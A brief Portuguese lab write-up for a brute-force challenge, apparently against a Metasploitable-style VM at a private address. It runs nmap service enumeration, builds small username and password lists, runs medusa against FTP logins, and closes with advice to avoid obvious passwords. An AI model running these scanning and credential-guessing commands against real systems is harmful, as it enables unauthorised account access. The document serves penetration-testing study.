# public

Desafio Ataque força bruta

Enumeração
ping -c 3 192.168.56.101
nmap -sV -p 21,22,80,445,139 192.168.56.101
ftp 192.168.56.101
apartir dai criei as lista de usuario e senhas
lista usuarios
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
lista de senhas
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

com as listas prontas usamos o medusa
medusa -h 192.168.56.101 -U users.txt -p pass.txt -M ftp -t 6

na lista que o medusa mostrar, procurar por ACCOUNT FOUND que sera o login SUCESSO
este primeiro medoto é para ataque forca bruta em FTP, para evitar este tipo de ataques e nao ter senhas obvias ou senhas faceis como numero do rg, telefone, data de nascimento e etc




